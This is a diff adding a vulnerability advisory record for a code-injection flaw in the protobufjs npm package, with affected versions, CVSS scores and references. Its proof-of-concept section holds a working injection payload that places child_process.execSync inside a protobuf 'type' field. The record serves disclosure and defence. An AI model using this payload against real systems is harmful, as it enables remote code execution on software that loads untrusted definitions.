@@ -1,0 +1,58 @@
+advisory_id: GHSA-xq3m-2v4x-88gg
+datasource_id: github_osv_importer_v2/GHSA-xq3m-2v4x-88gg
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/04/GHSA-xq3m-2v4x-88gg/GHSA-xq3m-2v4x-88gg.json
+aliases:
+  - CVE-2026-41242
+summary: |
+  Arbitrary code execution in protobufjs
+  ### Summary
+  protobufjs compiles protobuf definitions into JS functions. Attackers can manipulate these definitions to execute arbitrary JS code.
+
+  ### Details
+  Attackers can inject arbitrary code in the "type" fields of protobuf definitions, which will then execute during object decoding using that definition.
+
+  ### PoC
+  ```js
+  const protobuf = require('protobufjs');
+  maliciousDescriptor = JSON.parse(`{"nested":{"User":{"fields":{"id":{"type":"int32","id":1},"data":{"type":"Data(){console.log(process.mainModule.require('child_process').execSync('id').toString())};\\nfunction X","id":2}}},"Data(){console.log(process.mainModule.require('child_process').execSync('id').toString())};\\nfunction X":{"fields":{"content":{"type":"string","id":1}}}}}`)
+  const root = protobuf.Root.fromJSON(maliciousDescriptor);
+  const UserType = root.lookupType("User");
+  const userBytes = Buffer.from([0x08, 0x01, 0x12, 0x07, 0x0a, 0x05, 0x68, 0x65, 0x6c, 0x6c, 0x6f]);
+  try {
+      const user = UserType.decode(userBytes);
+  } catch (e) {}
+  ```
+
+  ### Impact
+  Remote code execution when attackers can control the protobuf definition files.
+impacted_packages:
+  - purl: pkg:npm/protobufjs
+    affected_versions: vers:npm/>=8.0.0|<8.0.1
+    fixed_versions: vers:npm/8.0.1
+    fixed_in_commits: []
+    introduced_in_commits: []
+  - purl: pkg:npm/protobufjs
+    affected_versions: vers:npm/<7.5.5
+    fixed_versions: vers:npm/7.5.5
+    fixed_in_commits: []
+    introduced_in_commits: []
+severities:
+  - score: '9.4'
+    scoring_system: cvssv4
+    scoring_elements: CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H
+    published_at: None
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/04/GHSA-xq3m-2v4x-88gg/GHSA-xq3m-2v4x-88gg.json
+  - score: CRITICAL
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url:
+weaknesses:
+  - CWE-94
+references:
+  - url: https://github.com/protobufjs/protobuf.js
+    reference_type:
+    reference_id:
+  - url: https://github.com/protobufjs/protobuf.js/security/advisories/GHSA-xq3m-2v4x-88gg
+    reference_type:
+    reference_id:
